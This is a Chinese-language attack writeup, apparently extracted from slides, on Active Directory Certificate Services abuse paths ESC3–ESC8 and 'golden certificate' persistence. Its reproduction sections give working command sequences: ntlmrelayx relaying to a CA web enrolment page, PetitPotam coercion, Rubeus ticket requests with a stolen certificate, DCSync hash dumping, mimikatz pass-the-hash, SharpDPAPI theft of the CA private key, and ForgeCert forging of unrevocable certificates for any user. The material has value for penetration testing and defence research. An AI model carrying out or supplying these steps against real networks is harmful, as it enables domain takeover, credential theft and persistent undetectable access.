使⽤公开的⼯具可以看到存在漏洞;
20
利⽤点：攻击者仍然可以使⽤任何 EKU 和任意证书值创建新证书，其中有很多攻击者可能会滥⽤（例
如，代码签名、服务器身份验证等）
LDAP查询
可以使⽤以下LDAP查询来枚举与此场景匹配的模板：
&(objectclass=pkicertificatetemplate)(!(mspki-
enrollment flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!
(mspki-ra signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!
(pkiextendedkeyusag e=*))))
个⼈觉得这个利⽤⾯并不⼤。
证书请求代理 EKU允许委托⼈代表其他⽤户申请证书。对于任何注册此模板的⽤户，⽣成的证书可
⽤于代表任何⽤户共同签署请求。
利⽤条件跟ESC1差不多，还需要：应⽤策略开启“证书申请代理”
ESC3
攻击路径
漏洞复现
21
使⽤公开的⼯具可以看到存在漏洞;
证书请求代理 EKU (OID 1.3.6.1.4.1.311.20.2.1) 在Microsoft ⽂档中称为“注册代理” ，允许委托⼈代表
另⼀个⽤户注册证书。对于注册此类模板的任何⼈，⽣成的证书可⽤于代表任何⽤户、任何架构版本 1 
模板或任何需要适当“授权签名/应⽤程序策略”的架构版本 2+ 模板共同签署请求发⾏要求。
微软⽂档： https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-
cersod/97f47d4c-2901-41fa-9616-96b94e1b5435
22
已在 Active Directory 中定义了⼀个证书模板，该模板具有msPKI-RA-Application-
Policies 属性  集，并带有 增强的密钥使⽤ (EKU) ；例如，1.3.6.1.4.1.311.20.2.1，
证书请求代理。证书模板还在 msPKI-Enrollment-Flag  字段上设置了 0x00000040 
(CT_FLAG_PREVIOUS_APPROVAL_VALIDATE_REENROLLMENT) 位。
注册代理具有包含 EKU 的证书，该 EKU 具有与先前模板的 msPKI-RA-Application-
Policies  属性中定义的相同对象标识符 (OID) 。
那么我们可以代表其他⽤户申请证书
CA 确定与请求对应的证书模板需要注册代理的签名。它验证签名并验证与签名关联的证书是否具有所
需的 EKU，如 [MS-WCCE] 部分。验证完成后，CA 颁发证书并将其发送给注册代理。
●
●
23
证书模板是活动⽬录中的可安全对象，这意味着在其"安全描述符"中，它们指定哪些活动⽬录委托⼈对
模板具有特定权利。如果允许意外或⾮特权的委托⼈编辑安全设置，则模板将被视为在访问控制级别上
配置错误。攻击者可能会将错误配置推送到模板，从⽽允许他们泄露活动⽬录域的元素。
Chris Falta 讨论了⼀种使⽤此错误配置来模拟域名⽤户、修改模板以允许虚拟智能卡注册、获取证书然
后重置模板的⽅法。
https://github.com/cfalta/PoshADCS
ESC4
24
如果模板的访问控制条⽬ (ACE) 允许意外的或没有特权的 Active Directory 主体编辑模板中的敏感安
全设置，则我们说模板在访问控制级别配置错误。也就是说，如果攻击者能够将访问链接到⼀个点，他
们可以主动将错误配置推送到⼀个不容易受到攻击的模板（例如，通过启⽤模板的 mspki-certificate-
name-flag 属性中的 CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT 位允许域身份验证）
易受攻击的PKI对象访问控制，基于ACL的相互连接关系的web是⼴泛的，它可以影响adcs的安全
性。证书模板之外的多个对象和证书颁发机构本身可能会对整个AD CS系统产⽣安全影响。
这些可能性包括（但不限于）：
● CA服务器的AD计算机对象（即通过S4U2Self或S4U2Proxy进⾏破坏）
● CA服务器的RPC/DCOM服务器
ESC5
25
● 容器CN=Public Key Services、CN=Services、CN=Configuration、DC=、DC=
中的任何⼦代AD对象或容器（例如，证书模板容器、证书颁发机构容器、NTAuthCertificates
对象、注册服务容器等）
如果低权限攻击者可以控制其中任何⼀个，则该攻击可能会危及PKI系统。
这个没什么好说的。
https://cqureacademy.com/blog/enhanced-key-usage
https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-
server-2012-R2-and-2012/dn786426(v=ws.11)#controlling-user-added-subject-
alternative-names
https://www.keyfactor.com/blog/hidden-dangers-certificate-subject-
alternative-names-sans/
证书机构还可以通过证书认证机构命令访问权限。
有两个重要的：
1. 管理卡（CA 管理员
2. 管理认证（经理批准）权限。这些权限应进⾏审核。
管理CA权限允许委托⼈执⾏多项⾏政操作，包括修改配置数据。管理认证权限允许⽤户批准待定的证
书。
在证书模板之外，证书颁发机构本身具有⼀组权限，以保护各种 CA 操作。这些权限可以从 cert srv . 
msc 访问，右击⼀个 CA ，选择属性，然后切换到 Security 选项卡
ESC6
ESC7
26
可以使⽤ PSPK I 的模块枚举 Get-CertificationAuthority|Get-
CertificationAuthorityAcl
其它细节可以参考：
https://social.technet.microsoft.com/wiki/contents/articles/10942.ad-cs-
security-guidance.aspx#Roles_and_activities
https://www.sysadmins.lv/projects/pspki/enable-policymoduleflag.aspx
https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf
法国⼈将其命名为"⼩河⻢"？？？？？or ⼩波坦？？？？
ESC8
27
AD CS 通过管理员可以选择安装的附加服务器⻆⾊⽀持多种基于 HTTP 的注册⽅法：
证书注册 Web 界⾯，通过安装证书颁发机构 Web 注册⻆⾊。
作为在http:///certsrv/ 上运⾏的 IIS 托管的 ASP Web 注册应⽤程序公开
证书注册服务 (CES)，通过安装证书注册 Web 服务⻆⾊。通过安装证书注册策略 Web 服务⻆⾊，
与证书注册策略 (CEP) Web 服务协同⼯作。 ⽹络设备注册服务 (NDES)，通过安装⽹络设备注册服
务 ⻆⾊。
这些基于 HTTP 的证书注册接⼝都容易受到 NTLM 中继攻击。
使⽤ NTLM 中继，攻击者可以模拟⼊站 NTLM 身份验证的受害者⽤户。在冒充受害⽤户时，攻击者可
以访问这些 Web 界⾯并根据⽤户或机器证书模板请求客户端身份验证证书。
默认情况下，证书注册服务（CES）、证书注册策略（CEP）Web服务和⽹络设备注册服务（NDES）
通过其授权HTTP头⽀持协商身份验证。协商认证⽀持Kerberos和NTLM；因此，攻击者可以在中继攻
击期间协商到NTLM身份验证。这些web服务在默认情况下不会启⽤HTTPS，但是HTTPS本身不能防⽌
NTLM中继攻击。只有当HTTPS与通道绑定相结合时，才能保护HTTPS服务免受NTLM中继攻击，adcs
没有为IIS上的身份验证启⽤扩展保护，那么并不能启⽤通道绑定。
NTLM中继到AD CS的web注册接⼝为攻击者提供了许多优势。攻击者在执⾏NTLM中继攻击时通常会
遇到的⼀个问题是，当发⽣⼊站身份验证并由攻击者中继时，滥⽤该身份验证的时间很短。特权帐户只
能对攻击者的计算机进⾏⼀次身份验证。攻击者的⼯具可以尝试使NTLM会话尽可能⻓时间处于活动状
态，但该会话通常只能在短时间内使⽤。此外，攻击者⽆法在受限制的NTLM会话中实施身份验证。
攻击者可以通过中继到AD CS web界⾯来解决这些限制。攻击者可以使⽤NTLM中继访问AD CS web界
⾯，并请求客户端身份验证证书作为受害者帐户。然后，攻击者可以通过Kerberos或Schannel进⾏身份
漏洞分析
28
验证，或者使⽤PKINIT获取受害者帐户的NTLM哈希。
这将使攻击者在很⻓⼀段时间内（即，⽆论证书的有效期有多⻓）对受害者帐户的访问得以巩固，并且
攻击者可以使⽤多个身份验证协议⾃由地对任何服务进⾏身份验证，⽽⽆需NTLM签名。
⾸先我们需要搭建⼀个辅助域控
漏洞复现
29
选择从主域复制，然后默认就⾏。
  repadmin /replsummary  测试⼀下
编译 ExAndroidDev 版本的 NtlmRelayX
git clone git clone https://github.com/ExAndroidDev/impacket
cd impacket
git switch ntlmrelayx-adcs-attack
python3 -m pip install .
这⾥使⽤的是kali linux环境
cd examples
python3 ntlmrelayx.py -t http://192.168.50.142/certsrv/certfnsh.asp  -
smb2support --adcs --template 'adcs'
然后使⽤PetitPotam可以强制帐户向受到攻击的计算机进⾏身份验证。
https://github.com/topotam/PetitPotam
 PetitPotam.exe  
30
ntlmrelayx成功进⾏relay，并获取到证书信息
Ntlmrelay 将⽣成 CSR 并尝试滥⽤易受攻击的 PKI 模板来⽣成证书
也可以使⽤@Lee Christensen强调了⼀种这样的技术，“printerbug”，它通过强制计算机帐户使⽤MS-
RPRN对攻击者的主机进⾏身份验证。
使⽤ Rubeus 获取带有证书的 Kerberos 票证
Rubeus.exe asktgt / user: DC$ / certificate: MIIRFQIBAzCCEN8G /ptt
31
使⽤命令 klist 检查⼀下
可以看到现在拥有⼀张具有特权的票证，可以让DCSyncing DC
32
我们拥有 DCSync 权限，可以转储域控制器中所有⽤户的所有哈希值/
PTH 到 DomainAdmin
由于我们现在拥有 DomainAdmin NTLM 哈希，因此我们只需执⾏Pass The Hash即可使⽤ Domain 
Admin 哈希。
这可以通过许多不同的⽅式来实现，这⾥我们使⽤ mimikatz pth
在DC中可以看到
默认情况下， AD 启⽤基于证书的身份验证。
域持久性
漏洞分析
33
要使⽤证书进⾏身份验证， CA 必须向账号颁发⼀个包含允许域身份验证的 EKU OID 的证书（例如客
户端身份验证）。
当 账号使⽤证书进⾏身份验证时， AD 在根 CA 和 NT Auth Certificates 验证证书链对象指定的 CA 
证书。
Active Directory 企业 CA 与 AD 的身份验证系统挂钩，CA 根证书私钥⽤于签署新颁发的证书。如果
我们窃取了这个私钥，我们是否能够伪造我们⾃⼰的证书，该证书可⽤于（⽆需智能卡）作为组织中的
任何⼈向 Active Directory 进⾏身份验证？
作者命名为⻩⾦证书
证书存在于 CA 服务器中，如果 TPM/HSM 不⽤于基于硬件的保护，那么其私钥受机器 DPAPI 保护。
如果密钥不受硬件保护，Mimikatz 和 SharpDPAPI 可以从 CA 中提取 CA 证书和私钥：
漏洞利⽤
34
设置密码就可以直接导出了
我们也可以直接使⽤⼯具导出。例如Mimikatz，SharpDPAPI.exe 
35
这⾥我使⽤的是SharpDPAPI.exe 
https://github.com/GhostPack/SharpDPAPI
Sha rpDPAPI.exe certificates /machine
使⽤Open SSL 可以直接输出证书
openssl pkcs12 -in ca.pem -keyex -CSP "Microsoft Enhanced  Cryptographic 
Provider v1.0" -export -out ca.pfx
对于包含CA证书和私钥的CA.pfx⽂件，伪造证书的⼀种⽅法是将其导⼊单独的脱机CA，并使⽤
MimiKatz的crypto：：scauth 函数⽣成和签名证书。
或者，可以⼿动⽣成证书，以确保对每个字段的粒度控制，并消除建⽴单独系统的需要。
36
在另⼀台主机中导⼊证书
37
我们可以使⽤原作者分布的⼯具⼀键伪造证书。
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "Password123!" --
Subject "CN=User" --SubjectAltName "PI:EMAIL" --
NewCertPath localadmin.pfx --NewCertPassword "NewPassword123!"
ForgeCert的原理 
https://people.eecs.berkeley.edu/~jonah/bc/org/bouncycastle/x509/X509V3Cert
ificateGenerator.html
38
伪造证书的过程可以在我们控制的主机中进⾏伪造。
伪造证书时指定的⽬标⽤户需要在 AD 中处于活动状态/启⽤状态，并且能够进⾏身份验证，因为身份
验证交换仍将作为该⽤户进⾏。例如，试图伪造 krbtgt 的证书是⾏不通的。
这个伪造的证书将有效到指定的结束⽇期（这⾥为⼀年），并且只要根 CA 证书有效（⼀般来说证书的
有效期从 5 年开始，但通常延⻓到 10 年以上）。这种滥⽤也不限于普通⽤户帐户也适⽤于机器帐户。
⽣成的证书可以与Rubeus⼀起使⽤来请求 TGT（和/或检索⽤户的 NTLM；）
39
由于我们没有经过正常的签发流程，这个伪造的证书是不能撤销的。在ADCS中也没办法发现这个伪造
的证书。
---⽹空对抗中⼼ 李国聪（李⽊）